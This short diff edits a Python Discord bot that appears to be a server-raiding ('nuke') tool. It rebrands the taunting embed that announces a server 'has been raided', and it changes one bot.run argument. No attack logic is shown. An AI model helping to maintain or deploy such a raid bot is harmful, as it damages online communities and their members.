@@ -39,7 +39,7 @@ AUTO_RAID_CONFIG = {
 EMBED_CONFIG = {
     "title"      : "\U0001f480  __NUKERS__",
     "description": (
-        "**Ton serveur vient d'\u00eatre raid par VOID-NUKE.**\n\n"
+        "**Ton serveur vient d'\u00eatre raid par NT.**\n\n"
         "_ _\n"
         f"**> {TELEGRAM_TAG}**\n"
         f"**> {DISCORD_TAG}**\n"
@@ -1198,4 +1198,4 @@ async def on_message(message: discord.Message):
 
 if __name__ == "__main__":
 
-    bot.run(bot_token, log_handler=None)
+    bot.run(bot_token)
